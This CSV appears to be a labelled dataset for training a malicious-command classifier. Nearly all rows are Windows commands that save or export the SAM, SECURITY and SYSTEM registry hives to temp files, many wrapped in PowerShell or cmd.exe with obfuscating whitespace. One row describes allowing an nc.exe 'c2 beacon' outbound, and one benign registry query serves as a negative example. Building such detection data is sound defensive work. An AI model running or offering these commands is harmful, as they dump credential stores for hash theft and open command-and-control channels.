text,label
reg save hklm\security c:\windows\temp\vtoxilaa.save,1
reg save hklm\security c:\windows\temp\6nen2voe.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\32200una.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\m1mfra7d.dat""",1
reg  save  hklm\sam  c:\windows\temp\vp44evwx.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\os9jp3t3.dat""",1
reg export hklm\system c:\windows\temp\uip5jb46.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\24fg9uek.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\txob9hno.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\cna9lwji.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\s1edyvpe.dat""",1
reg save hklm\security c:\windows\temp\mhocf1fw.save,1
reg save hklm\system c:\windows\temp\310nruao.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\cmsxsxep.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\jfosky4c.dat""",1
reg save hklm\system c:\windows\temp\ay7vn8ih.save,1
reg export hklm\security c:\windows\temp\nafxxnba.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\n3mgc42n.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\59px0fdw.dat""",1
reg export hklm\security c:\windows\temp\igzh773i.save,1
reg  save  hklm\security  c:\windows\temp\cbemqo80.save,1
reg save hklm\sam c:\windows\temp\flher2y6.save,1
reg export hklm\system c:\windows\temp\in72swbr.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\npc02szl.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ij2zr7d6.dat""",1
reg save hklm\sam c:\windows\temp\kqr30bnw.save,1
reg save hklm\system c:\windows\temp\fwi2ki9s.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\eyvd6t0q.dat""",1
reg export hklm\sam c:\windows\temp\0pa95chv.save,1
reg export hklm\sam c:\windows\temp\t0d4e2qg.save,1
reg export hklm\sam c:\windows\temp\4bt6r1jg.save,1
reg save hklm\security c:\windows\temp\lczkq66p.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\8av1q1es.dat""",1
reg export hklm\sam c:\windows\temp\03h9en5u.save,1
reg   export   hklm\system   c:\windows\temp\no6m83l7.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\2jjftxxp.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\0vddv86j.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\2cxiade6.dat""",1
reg export hklm\security c:\windows\temp\eg5b3vk7.save,1
reg save hklm\security c:\windows\temp\cv2fch0g.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\upzjj3xp.save""",1
reg export hklm\system c:\windows\temp\bpp3ee24.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\a0raqnwa.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\hg5dsp4i.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\b3et9upz.dat""",1
reg export hklm\sam c:\windows\temp\hz61500l.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\42v6gjs8.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\99yv1qlr.dat""",1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\gy4ir8k3.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\lj3s799f.dat""",1
reg  export  hklm\system  c:\windows\temp\mpvrrv06.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\9gi8fqq6.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\lkcbp8m7.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ipi1ml0t.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1vtk4gtj.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\mqr2rjyv.dat""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\fpltb3e8.dat""",1
reg   export   hklm\sam   c:\windows\temp\hqfv0yy3.save,1
reg export hklm\system c:\windows\temp\m1buh0cd.save,1
reg save hklm\security c:\windows\temp\rofytoea.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\6eo9s853.dat""""",1
reg   export   hklm\sam   c:\windows\temp\dzlb8tfn.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\rv4jbuv4.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\28nv60sy.dat""",1
reg export hklm\system c:\windows\temp\x345xico.save,1
reg save hklm\sam c:\windows\temp\x7hns4sb.save,1
reg export hklm\security c:\windows\temp\mvi8xoo1.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\inrqxqjo.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\bptgvsum.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\xs61myox.dat""",1
reg save hklm\system c:\windows\temp\z34d9zfs.save,1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\ky6d5p71.dat""",1
reg save hklm\security c:\windows\temp\e2c33nik.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\q306rdrz.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\efdcegkl.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\n2mqnhwm.dat""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\security c:\windows\temp\ttrxkavb.save,1
reg save hklm\system c:\windows\temp\embawqef.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\oeo2d1sl.dat""",1
reg save hklm\security c:\windows\temp\o5nqtwrw.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\mth1v6cc.dat""",1
reg export hklm\sam c:\windows\temp\oar04oi5.save,1
reg export hklm\security c:\windows\temp\ev38l4an.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\slpteaa2.dat""",1
reg save hklm\sam c:\windows\temp\ycjdenst.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\zipnkolb.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\pae8mj8s.dat""",1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\fb346ujk.dat""",1
reg save hklm\sam c:\windows\temp\tk5fsdqc.save,1
reg save hklm\system c:\windows\temp\i3d2m2si.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\oet1tmpi.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\eeirgm3q.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\j8su74gv.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\m2ucz5xh.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\o8ijaki1.dat""",1
reg export hklm\security c:\windows\temp\sn7ifugj.save,1
reg export hklm\system c:\windows\temp\ny38ba61.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\2bnobp9g.dat""",1
reg save hklm\security c:\windows\temp\1oaitfs7.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\1sevhjvq.dat""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\eh1qq423.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\fq722zol.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\rwy8ygde.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\x90rouz4.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\hi39htk2.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\9p0rmgs2.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\1bu832yx.dat""""",1
reg export hklm\system c:\windows\temp\vz1bo42b.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\6fvtvhct.dat""",1
reg export hklm\sam c:\windows\temp\l5ociycb.save,1
reg save hklm\system c:\windows\temp\22zn2ynb.save,1
reg save hklm\security c:\windows\temp\77bkpi7i.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\bnfim2ho.dat""",1
reg save hklm\security c:\windows\temp\rbj8tip0.save,1
reg export hklm\system c:\windows\temp\ggfjrfe7.save,1
reg  save  hklm\sam  c:\windows\temp\mgxsc35j.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ckqh6315.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\3bh1xdo1.dat""",1
reg export hklm\system c:\windows\temp\yqj25vgt.save,1
reg save hklm\sam c:\windows\temp\rnefm0ag.save,1
reg  save  hklm\system  c:\windows\temp\2gnpbxjc.save,1
reg export hklm\sam c:\windows\temp\k4l5qqlw.save,1
reg export hklm\sam c:\windows\temp\hp56kebm.save,1
reg  save  hklm\security  c:\windows\temp\lu97rsvz.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\e13buy1d.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\huk9qmsg.dat""",1
reg save hklm\sam c:\windows\temp\vlq5n80o.save,1
reg   save   hklm\security   c:\windows\temp\dlmhxnce.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\wv52xvmr.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\kyposgho.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\qxzltd9h.dat""",1
reg save hklm\system c:\windows\temp\sj3mdky1.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\acizymfi.dat""",1
reg export hklm\security c:\windows\temp\xgs4mez6.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\b3metaic.dat""",1
reg export hklm\sam c:\windows\temp\qh4o4j6d.save,1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\pm7noy9o.dat""""",1
reg   save   hklm\system   c:\windows\temp\nct61eul.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\8yejxriz.dat""",1
reg save hklm\system c:\windows\temp\o482m84v.save,1
reg save hklm\security c:\windows\temp\czspr61c.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\jfqoz57p.save""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\p6x5m3m7.dat""",1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\e5li5edg.save""",1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\rtv8s2hp.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\49mzpz7y.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\cjvar1kg.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\9ewlakzh.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\twhjx2h0.dat""",1
reg export hklm\system c:\windows\temp\7wwe5yy1.save,1
reg  save  hklm\security  c:\windows\temp\xb7zur16.save,1
reg save hklm\system c:\windows\temp\fxtz0w58.save,1
reg save hklm\system c:\windows\temp\q855oebj.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\z7ofghgq.dat""",1
reg export hklm\system c:\windows\temp\w7o3onik.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\obocng5e.dat""",1
reg save hklm\system c:\windows\temp\pkh1z38a.save,1
reg save hklm\system c:\windows\temp\xnj1u5fq.save,1
reg export hklm\security c:\windows\temp\7syep2wg.save,1
reg save hklm\sam c:\windows\temp\pbta2tqp.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\yaar0ld3.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\exrc0lgk.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\2ammz9z8.dat""""",1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\g1epvgad.save""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\21lpuhba.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\scwcrryi.dat""",1
reg save hklm\system c:\windows\temp\fbbmvq5v.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\vwa4cjbz.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\10yyct79.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\zpp72kj2.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\r8p7hgdk.dat""",1
reg export hklm\sam c:\windows\temp\rs564ttd.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\7kcz7p1g.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\5bi9w3sb.dat""",1
reg  save  hklm\security  c:\windows\temp\87obhvlo.save,1
reg save hklm\system c:\windows\temp\xsmk8s54.save,1
reg save hklm\system c:\windows\temp\rtsidkne.save,1
reg export hklm\system c:\windows\temp\l3nvmcgp.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\7zsy8gt1.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\fsey9alz.dat""",1
reg export hklm\system c:\windows\temp\gj0tjroy.save,1
reg export hklm\system c:\windows\temp\wl3gb05j.save,1
reg  export  hklm\security  c:\windows\temp\6rw4hk6b.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\afk8ffdg.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\q433z3rm.dat""",1
reg save hklm\sam c:\windows\temp\re8z6cm1.save,1
reg save hklm\system c:\windows\temp\gw7k42em.save,1
reg export hklm\sam c:\windows\temp\y34l16pt.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\jjjshl6d.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\2zz527zk.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\wnw4bl75.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\zmysdwln.dat""",1
reg export hklm\sam c:\windows\temp\dz01ounj.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\wofdtvzw.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\wujt6bqb.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\usm8ftf4.dat""",1
reg export hklm\sam c:\windows\temp\97zs6lll.save,1
reg   query   hkcu\console,0
reg save hklm\system c:\windows\temp\0j2rokig.save,1
reg save hklm\sam c:\windows\temp\ous4tfqo.save,1
reg save hklm\system c:\windows\temp\5jmu2k48.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\4pp3d13a.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\35jltny6.dat""""",1
reg export hklm\system c:\windows\temp\fl3tis64.save,1
reg export hklm\sam c:\windows\temp\3ppj5e7z.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\kdwextct.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\9w8xprps.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ge5zxmka.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\0w8annxj.dat""""",1
reg export hklm\sam c:\windows\temp\s8pc58lt.save,1
reg  export  hklm\security  c:\windows\temp\3lzhb61z.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\wyzpa7a4.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\yer4x2gw.dat""",1
reg export hklm\security c:\windows\temp\85z96csm.save,1
reg save hklm\system c:\windows\temp\vk3ihrp0.save,1
reg save hklm\sam c:\windows\temp\zl1zjpbp.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\56r56r8t.dat""",1
reg save hklm\security c:\windows\temp\ep0co4t1.save,1
reg export hklm\system c:\windows\temp\41dz9dis.save,1
reg save hklm\security c:\windows\temp\ld0crs9l.save,1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\p4aedx59.save""",1
reg save hklm\system c:\windows\temp\9odeck0w.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\aa6dizuo.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\b0zwqkhu.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\2f49qa4s.dat""",1
reg save hklm\sam c:\windows\temp\3nbt53v4.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\alqdq5zi.dat""",1
reg save hklm\security c:\windows\temp\2pbzzo7x.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\04i20hrz.dat""",1
reg export hklm\security c:\windows\temp\9443xess.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\rqfsg0n0.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\2rwl0sdz.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\8px10z4h.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\48qz7vrq.dat""",1
reg export hklm\security c:\windows\temp\t43vjaal.save,1
reg save hklm\security c:\windows\temp\scltjz4z.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\0m7ctolw.dat""",1
reg export hklm\sam c:\windows\temp\2mfrzcoo.save,1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\l3rwaer0.dat""",1
reg export hklm\security c:\windows\temp\dl2pvj16.save,1
reg save hklm\system c:\windows\temp\7lh2aszr.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\yurv5xcx.dat""",1
reg export hklm\sam c:\windows\temp\agf4tqhb.save,1
reg export hklm\security c:\windows\temp\0wi7sq9g.save,1
reg save hklm\security c:\windows\temp\k1e57ski.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ptysei2y.dat""",1
reg save hklm\security c:\windows\temp\z01cv5lr.save,1
reg export hklm\security c:\windows\temp\bca4d9hm.save,1
reg save hklm\security c:\windows\temp\shf0g9ch.save,1
reg export hklm\sam c:\windows\temp\223rbqqp.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\vk0ewp69.dat""",1
reg export hklm\sam c:\windows\temp\vm1x83iq.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\7n7ypglu.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\kubu1jqp.dat""",1
reg save hklm\system c:\windows\temp\5icgirce.save,1
reg export hklm\security c:\windows\temp\93u5zx7n.save,1
reg save hklm\security c:\windows\temp\nuqr6fih.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\1673hn8p.dat""""",1
reg save hklm\system c:\windows\temp\cghqoukz.save,1
reg save hklm\system c:\windows\temp\06z2lonl.save,1
reg save hklm\security c:\windows\temp\yjq7t0fy.save,1
reg export hklm\system c:\windows\temp\wzsuqmua.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\ki08hjr7.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\28m1r42v.dat""""",1
reg export hklm\sam c:\windows\temp\34o5aejh.save,1
reg save hklm\system c:\windows\temp\kgyoxxhv.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\y8wrrbtp.save""",1
reg save hklm\system c:\windows\temp\pi5ycsfq.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\xbdr8eyl.dat""""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\goq72uim.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\dc1j9asb.dat""",1
reg   export   hklm\sam   c:\windows\temp\zkfqq00f.save,1
reg export hklm\system c:\windows\temp\7j6rw0md.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\3zxfzbqy.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\dutlklzc.dat""""",1
reg save hklm\system c:\windows\temp\ezi55zdz.save,1
reg save hklm\sam c:\windows\temp\gj259fe9.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\gfbikbv7.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\z8g48mqx.dat""",1
reg save hklm\sam c:\windows\temp\uamxnehd.save,1
reg save hklm\system c:\windows\temp\n3j8l381.save,1
reg export hklm\system c:\windows\temp\u488nr1k.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\hntc7l5k.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\tsqalzvq.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\d4e6in16.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ifk2pvia.dat""",1
reg save hklm\system c:\windows\temp\jjxrx6os.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\sxj0rxec.dat""",1
reg export hklm\system c:\windows\temp\v9qsobix.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\4m0txrif.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\mqruwaug.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\sam c:\temp\psif1tii.dat""""",1
reg save hklm\system c:\windows\temp\ibezeaak.save,1
reg save hklm\sam c:\windows\temp\leiid8wx.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\haxm5wqz.dat""",1
reg export hklm\system c:\windows\temp\ix9xko3k.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\u4nvsf5c.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\oravlps6.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\5m2u46sf.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\18hxsk58.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\qiz8nylo.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\zqtjc35j.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\jsbrbuts.dat""",1
reg save hklm\sam c:\windows\temp\i48a31pn.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\w3v0bo8l.dat""",1
reg export hklm\system c:\windows\temp\5wm4pxtz.save,1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\security c:\temp\s7zr5oh4.dat""""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\w06ljnx1.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\b4s4gjg0.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\n27xethl.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\hbrm6bi0.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\4p4o0hcj.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\iln502w7.dat""",1
reg save hklm\security c:\windows\temp\rl0lse8d.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\jmny9czk.dat""",1
